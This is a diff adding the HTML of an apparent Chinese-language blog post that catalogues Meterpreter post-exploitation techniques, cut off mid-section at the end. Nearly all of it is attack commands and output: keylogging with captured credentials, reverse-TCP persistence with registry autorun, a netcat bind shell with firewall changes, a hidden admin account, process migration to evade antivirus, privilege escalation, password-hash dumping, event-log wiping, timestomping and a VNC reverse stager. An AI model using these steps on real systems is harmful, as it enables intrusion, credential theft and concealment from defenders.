@@ -1,0 +1,235 @@
+<!DOCTYPE html><html lang="en"><head><meta charset="utf-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1" /><meta name="baidu-site-verification" content="gDf3P6sfyW" /><meta name="360-site-verification" content="0c91ee58977e5924d92896a89289b668" /><meta name="sogou_site_verification" content="jHNtHqKt34"/><meta name="google-site-verification" content="An2eGWQakKFcIZ1YuwZSilNuSYlfHs1zH0Hr-OMW6oQ" /><title>Meterpreter功能汇总</title><meta name="description" content=""><meta name="keywords" content="meterpreter,持久化访问,键盘嗅探,进程转移,清理日志"><link rel="icon" href="/assets/favicon.ico"><link rel="apple-touch-icon" href="/assets/touch-icon.png"><link rel="stylesheet" href="/assets/core.css"><link rel="canonical" href="/2016/06/meterpreter/"><link rel="alternate" type="application/atom+xml" title="Vinny Wong's Blog" href="/feed.xml" /></head><body> <!-- search --><div class="searchform"> <label class="mk">$> </label> <input type="text" id="keyword"/> <a href="javascript:void(0);" class="clear"></a><ul class="suggest"></ul></div><script src="//lib.sinaapp.com/js/jquery/1.9.1/jquery-1.9.1.min.js"></script> <script src="/assets/main.js"></script><nav class="header-nav"> <a class="page-link" href="/">HOME</a> / <a class="page-link" href="/categories/">CATEGORY</a> / <a class="page-link" href="/feed.xml">FEED</a> / <a class="page-link" href="/about/">ABOUT</a></nav><main> <noscript><style> article .footnotes { display: block; }</style></noscript><article><div class="center"><h1>Meterpreter功能汇总</h1><time>2016-06-05</time></div><div class="divider"></div><ul id="markdown-toc"><li><a href="#meterpreter功能汇总" id="markdown-toc-meterpreter功能汇总">Meterpreter功能汇总</a><ul><li><a href="#键盘嗅探的两种方式" id="markdown-toc-键盘嗅探的两种方式">键盘嗅探的两种方式</a><ul><li><a href="#通过meterpreter自带keyscan工具" id="markdown-toc-通过meterpreter自带keyscan工具">通过meterpreter自带keyscan工具</a></li><li><a href="#通过postwindowscapturekeylog_recorder" id="markdown-toc-通过postwindowscapturekeylog_recorder">通过post/windows/capture/keylog_recorder</a></li></ul></li><li><a href="#多种持久化访问方式" id="markdown-toc-多种持久化访问方式">多种持久化访问方式</a><ul><li><a href="#通过persistence脚本" id="markdown-toc-通过persistence脚本">通过persistence脚本</a></li><li><a href="#通过metsvc服务的方式" id="markdown-toc-通过metsvc服务的方式">通过metsvc服务的方式</a></li><li><a href="#通过开启远程桌面" id="markdown-toc-通过开启远程桌面">通过开启远程桌面</a></li><li><a href="#通过nc上传新的后门" id="markdown-toc-通过nc上传新的后门">通过nc上传新的后门</a></li><li><a href="#通过在目标主机创建隐藏用户" id="markdown-toc-通过在目标主机创建隐藏用户">通过在目标主机创建隐藏用户</a></li></ul></li><li><a href="#后面进程内存空间迁移" id="markdown-toc-后面进程内存空间迁移">后面进程内存空间迁移</a><ul><li><a href="#查看后门进程id和目标主机所有进程id" id="markdown-toc-查看后门进程id和目标主机所有进程id">查看后门进程ID和目标主机所有进程ID</a></li><li><a href="#执行后门进程内存空间转移" id="markdown-toc-执行后门进程内存空间转移">执行后门进程内存空间转移</a></li><li><a href="#查看后门进程转移后的进程id" id="markdown-toc-查看后门进程转移后的进程id">查看后门进程转移后的进程ID</a></li></ul></li><li><a href="#调用目标主机本地api" id="markdown-toc-调用目标主机本地api">调用目标主机本地API</a><ul><li><a href="#管理员权限获取" id="markdown-toc-管理员权限获取">管理员权限获取</a></li><li><a href="#进入ruby交互环境" id="markdown-toc-进入ruby交互环境">进入ruby交互环境</a></li><li><a href="#使用railgun组件" id="markdown-toc-使用railgun组件">使用railgun组件</a></li><li><a href="#键盘记录结合锁屏" id="markdown-toc-键盘记录结合锁屏">键盘记录结合锁屏</a></li></ul></li><li><a href="#安卓中的特殊功能" id="markdown-toc-安卓中的特殊功能">安卓中的特殊功能</a><ul><li><a href="#移除目标锁屏" id="markdown-toc-移除目标锁屏">移除目标锁屏</a></li><li><a href="#隐藏木马应用图标" id="markdown-toc-隐藏木马应用图标">隐藏木马应用图标</a></li></ul></li><li><a href="#其他常用功能汇总" id="markdown-toc-其他常用功能汇总">其他常用功能汇总</a><ul><li><a href="#windows中hash密码的使用" id="markdown-toc-windows中hash密码的使用">windows中hash密码的使用</a></li><li><a href="#终端shell权限提升" id="markdown-toc-终端shell权限提升">终端shell权限提升</a></li><li><a href="#清理踪迹日志" id="markdown-toc-清理踪迹日志">清理踪迹日志</a></li><li><a href="#修改文件时间戳" id="markdown-toc-修改文件时间戳">修改文件时间戳</a></li><li><a href="#在目标系统上执行和搜索文件" id="markdown-toc-在目标系统上执行和搜索文件">在目标系统上执行和搜索文件</a></li><li><a href="#在目标系统上使用vnc远程桌面" id="markdown-toc-在目标系统上使用vnc远程桌面">在目标系统上使用vnc远程桌面</a></li><li><a href="#查看目标主机安装的程序补丁以及最近操作的文件" id="markdown-toc-查看目标主机安装的程序补丁以及最近操作的文件">查看目标主机安装的程序、补丁以及最近操作的文件</a></li><li><a href="#抓取目标主机网络流量" id="markdown-toc-抓取目标主机网络流量">抓取目标主机网络流量</a></li></ul></li></ul></li></ul><hr /><h1 id="meterpreter功能汇总">Meterpreter功能汇总</h1><h2 id="键盘嗅探的两种方式">键盘嗅探的两种方式</h2><h3 id="通过meterpreter自带keyscan工具">通过meterpreter自带keyscan工具</h3><div class="language-shell highlighter-rouge"><pre class="highlight"><code><span class="c"># 开启键盘监听</span>
+meterpreter &gt; keyscan_start
+Starting the keystroke sniffer...
+
+<span class="c"># 查询监听到的键盘信息</span>
+meterpreter &gt; keyscan_dump
+Dumping captured keystrokes...
+jd.com15312069323 &lt;Tab&gt; 123456
+
+<span class="c"># 停止键盘监听</span>
+meterpreter &gt; keyscan_stop
+Stopping the keystroke sniffer...
+</code></pre></div><h3 id="通过postwindowscapturekeylog_recorder">通过post/windows/capture/keylog_recorder</h3><div class="language-shell highlighter-rouge"><pre class="highlight"><code><span class="c"># 使用post/windows/capture/keylog_recorder</span>
+meterpreter &gt; run post/windows/capture/keylog_recorder
+
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Executing module against EVAN
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Starting the keystroke sniffer...
+<span class="c"># 监听记录的文件位置</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Keystrokes being saved <span class="k">in </span>to /root/.msf5/loot/20160604202319_default_192.168.3.11_host.windows.key_380125.txt
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Recording keystrokes...
+</code></pre></div><h2 id="多种持久化访问方式">多种持久化访问方式</h2><h3 id="通过persistence脚本">通过persistence脚本</h3><div class="language-shell highlighter-rouge"><pre class="highlight"><code><span class="c"># -X 开机自启动</span>
+<span class="c"># -i &lt;num&gt; payload重连的间隔时间</span>
+<span class="c"># -p 反向连接端口号</span>
+<span class="c"># -r 反向连接IP地址</span>
+<span class="c">#</span>
+<span class="c"># 更多使用方法请参考帮助 run persistence -h</span>
+meterpreter &gt; run persistence -X -i 5 -p 4444 -r 192.168.3.12
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Running Persistance Script
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Resource file <span class="k">for </span>cleanup created at /root/.msf5/logs/persistence/EVAN_20160604.3957/EVAN_20160604.3957.rc
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Creating <span class="nv">Payload</span><span class="o">=</span>windows/meterpreter/reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>192.168.3.12 <span class="nv">LPORT</span><span class="o">=</span>4444
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Persistent agent script is 148461 bytes long
+<span class="o">[</span>+] Persistent Script written to C:<span class="se">\D</span>OCUME~1<span class="se">\w</span>angjun<span class="se">\L</span>OCALS~1<span class="se">\T</span>emp<span class="se">\V</span>KZehDGmg.vbs
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Executing script C:<span class="se">\D</span>OCUME~1<span class="se">\w</span>angjun<span class="se">\L</span>OCALS~1<span class="se">\T</span>emp<span class="se">\V</span>KZehDGmg.vbs
+<span class="o">[</span>+] Agent executed with PID 3892
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Installing into autorun as HKLM<span class="se">\S</span>oftware<span class="se">\M</span>icrosoft<span class="se">\W</span>indows<span class="se">\C</span>urrentVersion<span class="se">\R</span>un<span class="se">\U</span>ymiaoVKhfXxH
+<span class="o">[</span>+] Installed into autorun as HKLM<span class="se">\S</span>oftware<span class="se">\M</span>icrosoft<span class="se">\W</span>indows<span class="se">\C</span>urrentVersion<span class="se">\R</span>un<span class="se">\U</span>ymiaoVKhfXxH
+</code></pre></div><h3 id="通过metsvc服务的方式">通过metsvc服务的方式</h3><p>运行<code class="highlighter-rouge">run metsvc</code>将会在目标主机上以Meterpreter的服务的形式注册在服务列表中，并开机自动自动。运行<code class="highlighter-rouge">run metsvc -r</code>卸载目标主机上的Meterpreter服务。</p><div class="language-shell highlighter-rouge"><pre class="highlight"><code>meterpreter &gt; run metsvc
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Creating a meterpreter service on port 31337
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Creating a temporary installation directory C:<span class="se">\D</span>OCUME~1<span class="se">\w</span>angjun<span class="se">\L</span>OCALS~1<span class="se">\T</span>emp<span class="se">\P</span>CDqsWgh...
+<span class="o">[</span><span class="k">*</span><span class="o">]</span>  &gt;&gt; Uploading metsrv.x86.dll...
+<span class="o">[</span><span class="k">*</span><span class="o">]</span>  &gt;&gt; Uploading metsvc-server.exe...
+<span class="o">[</span><span class="k">*</span><span class="o">]</span>  &gt;&gt; Uploading metsvc.exe...
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Starting the service...
+     <span class="k">*</span> Installing service metsvc
+ <span class="k">*</span> Starting service
+Service metsvc successfully installed.
+</code></pre></div><h3 id="通过开启远程桌面">通过开启远程桌面</h3><div class="language-shell highlighter-rouge"><pre class="highlight"><code><span class="c"># 强制开启目标主机远程桌面并自动添加用户名为metasploit密码为meterpreter的用户</span>
+run getgui -u metasploit -p meterpreter
+<span class="c"># 上面命令会生成清理痕迹的ruby的脚本文件，位置在/root/.msf4/logs/scripts/getgui/clean_up_xxxxx.rc</span>
+<span class="c"># 当操作完目标用户后可以使用此脚本清理痕迹、关闭远程桌面服务和删除创建的用户</span>
+un multi_console_command -rc /root/.msf4/logs/scripts/getgui/clean_up_xxxxx.rc
+</code></pre></div><h3 id="通过nc上传新的后门">通过nc上传新的后门</h3><div class="language-shell highlighter-rouge"><pre class="highlight"><code><span class="c"># 上传nc.exe至目标主机</span>
+meterpreter &gt; upload /root/Desktop/nc.exe c:<span class="se">\\</span>windows<span class="se">\\</span>system32
+<span class="c"># 枚举查看注册表启动项</span>
+meterpreter &gt; reg enumkey -k HKLM<span class="se">\\</span>software<span class="se">\\</span>microsoft<span class="se">\\</span>windows<span class="se">\\</span>currentversion<span class="se">\\</span>run
+<span class="c"># 将nc.exe设置到注册表启动项中</span>
+meterpreter &gt; reg setval -k HKLM<span class="se">\\</span>software<span class="se">\\</span>microsoft<span class="se">\\</span>windows<span class="se">\\</span>currentversion<span class="se">\\</span>run -v nc -d <span class="s1">'c:\windows\system32\nc.exe -Ldp 455 -e cmd.exe'</span>
+<span class="c"># 查看以确定nc已经被设置到注册表启动项中</span>
+meterpreter &gt; reg queryval -k HKLM<span class="se">\\</span>software<span class="se">\\</span>microsoft<span class="se">\\</span>windows<span class="se">\\</span>currentversion<span class="se">\\</span>Run -v nc
+<span class="c"># 进入目标系统cmd</span>
+eterpreter &gt; execute -f cmd -i
+<span class="c"># 查看目标系统当前防火墙规则</span>
+c:<span class="se">\D</span>ocument and Setting<span class="se">\r</span>ush<span class="se">\D</span>esktop &gt; netsh firewall show opmode
+<span class="c"># 将nc开放的端口加入到目标系统防火墙规则中</span>
+c:<span class="se">\D</span>ocument and Setting<span class="se">\r</span>ush<span class="se">\D</span>esktop &gt; netsh firewall add portopening TCP 455 <span class="s2">"Service Firewall"</span> ENABLE ALL
+<span class="c"># 查看目标系统防火墙端口开放状态</span>
+c:<span class="se">\D</span>ocument and Setting<span class="se">\r</span>ush<span class="se">\D</span>esktop &gt; netsh firewall show portopening
+
+<span class="c"># 转至攻击主机上，执行nc连接到目标主机上，得到shell</span>
+nc -v 192.168.0.3 455
+</code></pre></div><h3 id="通过在目标主机创建隐藏用户">通过在目标主机创建隐藏用户</h3><div class="language-shell highlighter-rouge"><pre class="highlight"><code><span class="c"># 创建用户（注意这里用户使用了$符号，可以起到隐藏创建用户的目的）</span>
+c:<span class="se">\D</span>ocument and Setting<span class="se">\r</span>ush<span class="se">\D</span>esktop &gt; net user hacker<span class="nv">$ </span>hacker /add
+
+<span class="c"># 将创建的用户添加到管理员组</span>
+c:<span class="se">\D</span>ocument and Setting<span class="se">\r</span>ush<span class="se">\D</span>esktop &gt; net localgroup administrators hacker<span class="nv">$ </span>/add
+</code></pre></div><h2 id="后面进程内存空间迁移">后面进程内存空间迁移</h2><p>程迁移的意思是，将原有后门执行的进程迁移到另外一个进程空间中去（这也是我们拿到shell第一步应该做的）。这样做可以避免杀毒软件查杀此进程导致shell中断，也可以避免很容易的猜测中进程列表中后面进程。</p><h3 id="查看后门进程id和目标主机所有进程id">查看后门进程ID和目标主机所有进程ID</h3><div class="language-shell highlighter-rouge"><pre class="highlight"><code>meterpreter &gt; getpid
+Current pid: 1532
+
+meterpreter &gt; ps
+
+Process List
+<span class="o">============</span>
+
+ PID   PPID  Name              Arch  Session  User                 Path
+ ---   ----  ----              ----  -------  ----                 ----
+ 0     0     <span class="o">[</span>System Process]
+ 4     0     System            x86   0
+ 416   4     smss.exe          x86   0        NT AUTHORITY<span class="se">\S</span>YSTEM  <span class="se">\S</span>ystemRoot<span class="se">\S</span>ystem32<span class="se">\s</span>mss.exe
+ 652   416   csrss.exe         x86   0        NT AUTHORITY<span class="se">\S</span>YSTEM  <span class="se">\?</span>?<span class="se">\C</span>:<span class="se">\W</span>INDOWS<span class="se">\s</span>ystem32<span class="se">\c</span>srss.exe
+ 676   416   winlogon.exe      x86   0        NT AUTHORITY<span class="se">\S</span>YSTEM  <span class="se">\?</span>?<span class="se">\C</span>:<span class="se">\W</span>INDOWS<span class="se">\s</span>ystem32<span class="se">\w</span>inlogon.exe
+ 720   676   services.exe      x86   0        NT AUTHORITY<span class="se">\S</span>YSTEM  C:<span class="se">\W</span>INDOWS<span class="se">\s</span>ystem32<span class="se">\s</span>ervices.exe
+ 732   676   lsass.exe         x86   0        NT AUTHORITY<span class="se">\S</span>YSTEM  C:<span class="se">\W</span>INDOWS<span class="se">\s</span>ystem32<span class="se">\l</span>sass.exe
+ 904   720   VBoxService.exe   x86   0        NT AUTHORITY<span class="se">\S</span>YSTEM  C:<span class="se">\W</span>INDOWS<span class="se">\s</span>ystem32<span class="se">\V</span>BoxService.exe
+ 952   720   svchost.exe       x86   0        NT AUTHORITY<span class="se">\S</span>YSTEM  C:<span class="se">\W</span>INDOWS<span class="se">\s</span>ystem32<span class="se">\s</span>vchost.exe
+ 1136  720   svchost.exe       x86   0                             C:<span class="se">\W</span>INDOWS<span class="se">\s</span>ystem32<span class="se">\s</span>vchost.exe
+ 1532  1968  a.exe             x86   0        EVAN<span class="se">\w</span>angjun         C:<span class="se">\D</span>ocuments and Settings<span class="se">\w</span>angjun<span class="se">\�</span>���<span class="se">\a</span>.exe
+ 1584  720   svchost.exe       x86   0        NT AUTHORITY<span class="se">\S</span>YSTEM  C:<span class="se">\W</span>INDOWS<span class="se">\S</span>ystem32<span class="se">\s</span>vchost.exe
+ 1768  720   svchost.exe       x86   0                             C:<span class="se">\W</span>INDOWS<span class="se">\s</span>ystem32<span class="se">\s</span>vchost.exe
+ 1800  1968  ctfmon.exe        x86   0        EVAN<span class="se">\w</span>angjun         C:<span class="se">\W</span>INDOWS<span class="se">\s</span>ystem32<span class="se">\c</span>tfmon.exe
+ 1936  720   svchost.exe       x86   0                             C:<span class="se">\W</span>INDOWS<span class="se">\s</span>ystem32<span class="se">\s</span>vchost.exe
+ 1968  1860  explorer.exe      x86   0        EVAN<span class="se">\w</span>angjun         C:<span class="se">\W</span>INDOWS<span class="se">\E</span>xplorer.EXE
+</code></pre></div><p>从上面的进程列表中看出，后面进程id是1532的a.exe（其实应该将后面程序名称设置成更有迷惑性的，如svchast.exe），此时很容易被用户或者杀毒软件查到。这时应该使用 migrate 进程进程空间转移，转移的目标到进程id是1968的explorer.exe桌面进程中。</p><h3 id="执行后门进程内存空间转移">执行后门进程内存空间转移</h3><div class="language-shell highlighter-rouge"><pre class="highlight"><code>meterpreter &gt; migrate 1968
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Migrating from 1532 to 1968...
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Migration completed successfully.
+</code></pre></div><p>从上面得知，进程转移成功，后门进程已经成功的从1532转移到了explorer.exe的1968的进程中去了，由于explorer.exe是windows桌面进程，所以无法查杀。原来的1532的后门进程也没有了，此时可以再次使用getpid命令进程进程id查看。</p><h3 id="查看后门进程转移后的进程id">查看后门进程转移后的进程ID</h3><div class="language-shell highlighter-rouge"><pre class="highlight"><code>meterpreter &gt; getpid
+Current pid: 1968
+</code></pre></div><p>这里要注意的是，有时候使用<code class="highlighter-rouge">migrate</code>进程进程转移时并不能成功，此时多数情况是当前shell的用户没有权限导致，可以使用<code class="highlighter-rouge">getsystem</code>获取管理员权限然后再次执行进程转移。</p><h2 id="调用目标主机本地api">调用目标主机本地API</h2><p>meterpreter中通过irb进入ruby的交互环境，调用目标系统本地API使用的是<strong>railgun</strong>组件。调用目标系统API运行，这个功能有很大的扩展性，相当于在目标系统上编写代码并运行，可以做的事情由你自己发挥。</p><h3 id="管理员权限获取">管理员权限获取</h3><div class="language-shell highlighter-rouge"><pre class="highlight"><code><span class="c"># 查看当前用户</span>
+meterpreter &gt; getuid
+Server username: EVAN<span class="se">\w</span>angjun
+<span class="c"># 获取系统用户权限</span>
+meterpreter &gt; getsystem
+...got system via technique 1 <span class="o">(</span>Named Pipe Impersonation <span class="o">(</span>In Memory/Admin<span class="o">))</span>.
+<span class="c"># 再次查看当前用户，已变更</span>
+meterpreter &gt; getuid
+Server username: NT AUTHORITY<span class="se">\S</span>YSTEM
+</code></pre></div><h3 id="进入ruby交互环境">进入ruby交互环境</h3><div class="language-shell highlighter-rouge"><pre class="highlight"><code><span class="c"># 在meterpreter的shell中使用命令irb进入ruby交互环境</span>
+meterpreter &gt; irb
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Starting IRB shell
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> The <span class="s1">'client'</span> variable holds the meterpreter client
+&gt;&gt;
+</code></pre></div><h3 id="使用railgun组件">使用railgun组件</h3><div class="language-shell highlighter-rouge"><pre class="highlight"><code><span class="c"># 列出可用的dll</span>
+<span class="gp">&gt;&gt; </span>client.railgun.known_dll_names
+<span class="gp">=&gt; </span><span class="o">[</span><span class="s2">"kernel32"</span>, <span class="s2">"ntdll"</span>, <span class="s2">"user32"</span>, <span class="s2">"ws2_32"</span>, <span class="s2">"iphlpapi"</span>, <span class="s2">"advapi32"</span>, <span class="s2">"shell32"</span>, <span class="s2">"netapi32"</span>, <span class="s2">"crypt32"</span>, <span class="s2">"wlanapi"</span>, <span class="s2">"wldap32"</span>, <span class="s2">"version"</span>, <span class="s2">"psapi"</span><span class="o">]</span>
+<span class="c"># 获取目标系统信息</span>
+<span class="gp">&gt;&gt; </span>client.sys.config.sysinfo
+<span class="gp">=&gt; </span><span class="o">{</span><span class="s2">"Computer"</span><span class="o">=</span>&gt;<span class="s2">"EVAN"</span>, <span class="s2">"OS"</span><span class="o">=</span>&gt;<span class="s2">"Windows XP (Build 2600, Service Pack 3)."</span>, <span class="s2">"Architecture"</span><span class="o">=</span>&gt;<span class="s2">"x86"</span>, <span class="s2">"System Language"</span><span class="o">=</span>&gt;<span class="s2">"zh_CN"</span>, <span class="s2">"Domain"</span><span class="o">=</span>&gt;<span class="s2">"WORKGROUP"</span>, <span class="s2">"Logged On Users"</span><span class="o">=</span>&gt;2<span class="o">}</span>
+<span class="c"># 获取当前用户id</span>
+<span class="gp">&gt;&gt; </span>client.sys.config.getuid
+<span class="gp">=&gt; </span><span class="s2">"NT AUTHORITY</span><span class="se">\\</span><span class="s2">SYSTEM"</span>
+<span class="c"># 获取所有网卡信息</span>
+<span class="gp">&gt;&gt; </span>init <span class="o">=</span> client.net.config.interfaces
+<span class="gp">&gt;&gt; </span>init.each <span class="o">{</span> |x| puts x.pretty <span class="o">}</span>
+
+<span class="c"># 调用消息框函数MessageBoxA弹出信息</span>
+<span class="gp">&gt;&gt; </span>client.railgun.user32.MessageBoxA<span class="o">(</span>0, <span class="s2">"Hello World"</span>, <span class="s2">"Osanda"</span>, <span class="s2">"MB_ICONASTERISK | MB_OK"</span> <span class="o">)</span>
+<span class="c"># 防止目标主机在meterpreter会话期间进入睡眠状态</span>
+<span class="gp">&gt;&gt; </span>client.railgun.kernel32.SetThreadExecutionState<span class="o">(</span><span class="s2">"ES_CONTINUOUS|ES_SYSTEM_REQUIRED"</span><span class="o">)</span>
+<span class="c"># 让目标系统锁屏</span>
+<span class="gp">&gt;&gt; </span>client.railgun.user32.LockWorkStation<span class="o">()</span>
+</code></pre></div><h3 id="键盘记录结合锁屏">键盘记录结合锁屏</h3><p>原理是先后台开启键盘记录，然后强制锁屏，用户输入密码登录得到用户输入内容。</p><div class="language-shell highlighter-rouge"><pre class="highlight"><code><span class="c"># 后台运行键盘记录，每15秒dump到记录文件中</span>
+meterpreter &gt; bgrun keylogrecorder -c 1 -t 15
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Executed Meterpreter with Job ID 0
+meterpreter &gt; <span class="o">[</span><span class="k">*</span><span class="o">]</span> winlogon.exe Process found, migrating into 640
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Migration Successful!!
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Starting the keystroke sniffer...
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Keystrokes being saved <span class="k">in </span>to /root/.msf3/logs/scripts/keylogrecorder/192.168.92.122_20100707.4539.txt
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Recording
+
+<span class="c"># 调用目标系统锁屏函数</span>
+meterpreter &gt; irb
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Starting IRB shell
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> The <span class="s1">'client'</span> variable holds the meterpreter client
+
+client.core.use<span class="o">(</span><span class="s2">"railgun"</span><span class="o">)</span>
+<span class="gp">=&gt; </span><span class="nb">true
+</span>client.railgun.user32.LockWorkStation<span class="o">()</span>
+<span class="gp">=&gt; </span><span class="o">{</span><span class="s2">"GetLastError"</span><span class="o">=</span>&gt;0, <span class="s2">"return"</span><span class="o">=</span>&gt;true<span class="o">}</span>
+<span class="nb">exit
+
+</span>meterpreter &gt;
+meterpreter &gt; bglist
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Job 0: <span class="o">[</span><span class="s2">"keylogrecorder"</span>, <span class="s2">"-c"</span>, <span class="s2">"1"</span>, <span class="s2">"-t"</span>, <span class="s2">"15"</span><span class="o">]</span>
+meterpreter &gt; bgkill 0
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Killing background job 0...
+meterpreter &gt;
+</code></pre></div><p>更多的windows函数请自行参考msdn自由发挥，查找本地<strong>railgun</strong>函数，在终端中输入<code class="highlighter-rouge">locate railgun</code>即可。</p><h2 id="安卓中的特殊功能">安卓中的特殊功能</h2><h3 id="移除目标锁屏">移除目标锁屏</h3><div class="language-shell highlighter-rouge"><pre class="highlight"><code>post/android/manage/remove_lock
+</code></pre></div><h3 id="隐藏木马应用图标">隐藏木马应用图标</h3><div class="language-shell highlighter-rouge"><pre class="highlight"><code><span class="gp">&gt; </span>hide_app_icon
+</code></pre></div><h2 id="其他常用功能汇总">其他常用功能汇总</h2><h3 id="windows中hash密码的使用">windows中hash密码的使用</h3><p>拿到目标主机hashdump值目的就是获取目标主机的登录密码，可以通过<strong>L0phtCrack</strong>或者<strong>ophcrack</strong>等工具进行破解得到明文密码。但有时候也并不是需要破解hash值，metasploit里有很多功能功能可以通过hash传递获取目标主机权限。</p><div class="language-shell highlighter-rouge"><pre class="highlight"><code><span class="c"># dump出目标主机用户名密码</span>
+meterpreter &gt; hashdump
+admin:1007:f0d412bd764ffe81aad3b435b51404ee:209c6174da490caeb422f3fa5a7ae634:::
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+HelpAssistant:1000:496f4dcd132458b604fd1c9a01b28dc9:788d18962d30303246126d61f1fed54c:::
+metasploit:1006:ab594876e19d0e7b3fa46817fc0ee1fb:d1508f574ec4ce7358fb0c87949072a7:::
+SUPPORT_388945a0:1002:aad3b435b51404eeaad3b435b51404ee:00f0e7d86e6837feb487c8f18eeace02:::
+wangjun:1003:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+</code></pre></div><h3 id="终端shell权限提升">终端shell权限提升</h3><div class="language-shell highlighter-rouge"><pre class="highlight"><code><span class="c"># 查看当前用户</span>
+meterpreter &gt; getuid
+Server username: EVAN<span class="se">\w</span>angjun
+<span class="c"># 获取系统用户权限</span>
+meterpreter &gt; getsystem
+...got system via technique 1 <span class="o">(</span>Named Pipe Impersonation <span class="o">(</span>In Memory/Admin<span class="o">))</span>.
+<span class="c"># 再次查看当前用户，已变更</span>
+meterpreter &gt; getuid
+Server username: NT AUTHORITY<span class="se">\S</span>YSTEM
+</code></pre></div><h3 id="清理踪迹日志">清理踪迹日志</h3><p>当在目标主机上做了很多操作时，系统默认将一些特殊的操作以日志的形式记录在系统中，如果不刻意的清理日志，很容易会被追查出来。</p><div class="language-shell highlighter-rouge"><pre class="highlight"><code>meterpreter &gt; clearev
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Wiping 0 records from Application...
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Wiping 0 records from System...
+</code></pre></div><h3 id="修改文件时间戳">修改文件时间戳</h3><p>对目标系统某个文件进行操作后，默认文件的时间会更新，在一些谨慎的管理员眼中很容易识别出文件已经被修改过或查阅过，此时需要将文件的时间戳改变为初始的状态。</p><div class="language-shell highlighter-rouge"><pre class="highlight"><code><span class="c"># 查看文件的MACE值得，MACE是四个时间的首字母</span>
+meterpreter &gt; timestomp -v secret.doc
+Modified      : 2016-06-04 22:25:44 +0800
+Accessed      : 2016-06-04 23:20:41 +0800
+Created       : 2016-06-04 22:25:44 +0800
+Entry Modified: 2016-06-04 22:30:36 +0800
+<span class="c"># 修改目标文件时间</span>
+meterpreter &gt; timestomp secret.doc -c <span class="s2">"1/15/2015 15:15:25"</span>
+meterpreter &gt; timestomp secret.doc -a <span class="s2">"1/15/2015 15:15:25"</span>
+meterpreter &gt; timestomp secret.doc -m <span class="s2">"1/15/2015 15:15:25"</span>
+meterpreter &gt; timestomp secret.doc -e <span class="s2">"1/15/2015 15:15:25"</span>
+<span class="c"># 以另一个文件的时间戳为基础修改</span>
+meterpreter &gt; timestomp secret.doc -f C:<span class="se">\\</span>WINNT<span class="se">\\</span>system32<span class="se">\\</span>cmd.exe
+</code></pre></div><h3 id="在目标系统上执行和搜索文件">在目标系统上执行和搜索文件</h3><p>同属于文件系统命令，上传下载都很简单，搜索和执行文件由于有特殊参数所以这里点一下。</p><div class="language-shell highlighter-rouge"><pre class="highlight"><code><span class="c"># 运行目标机器上程序</span>
+meterpreter &gt; execute -f c:<span class="se">\\</span>windows<span class="se">\\</span>notepad.exe
+Process 2132 created.
+<span class="c"># 加上-H表示隐藏的执行</span>
+meterpreter &gt; execute -f -H c:<span class="se">\\</span>windows<span class="se">\\</span>notepad.exe
+<span class="c"># 在指定目录下搜索指定文件</span>
+meterpreter &gt; search -d c:<span class="se">\\</span>windows<span class="se">\\</span>system32 -f hosts
+</code></pre></div><h3 id="在目标系统上使用vnc远程桌面">在目标系统上使用vnc远程桌面</h3><p>为了可以实时观察目标主机桌面操作情况，可以开始vnc服务，原理是上传vnc的服务，远程执行并连接。vnc不同与3389的远程桌面，若用远程桌面连接则会中断用户操作。</p><div class="language-shell highlighter-rouge"><pre class="highlight"><code><span class="c"># 开启目标主机vnc服务</span>
+meterpreter &gt; run vnc
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Creating a VNC reverse tcp stager: <span class="nv">LHOST</span><span class="o">=</span>192.168.3.12 <span class="nv">LPORT</span><span class="o">=</span>4545
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Running payload handler
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> VNC stager executable 73802 bytes long
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Uploaded the VNC agent to C:<span class="se">\D</span>OCUME~1<span class="se">\w</span>angjun<span class="se">\L</span>OCALS~1<span class="se">\T</span>emp<span class="se">\i</span>wbSDvEUrDEU.exe <span class="o">(</span>must be deleted manually<span class="o">)</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Executing the VNC agent with endpoint 192.168.3.12:4545...
+</code></pre></div><h3 id="查看目标主机安装的程序补丁以及最近操作的文件">查看目标主机安装的程序、补丁以及最近操作的文件</h3><p>很多情况我们需要知道目标系统上到底安装了哪些软件，以便我们针对不同安装的软件进行渗透操作。也许你希望查看用户最近操作了哪些文件或者程序。</p><div class="language-shell highlighter-rouge"><pre class="highlight"><code><span class="c"># 获取目标主机最近进行的系统操作、访问文件和office文档操作记录</span>
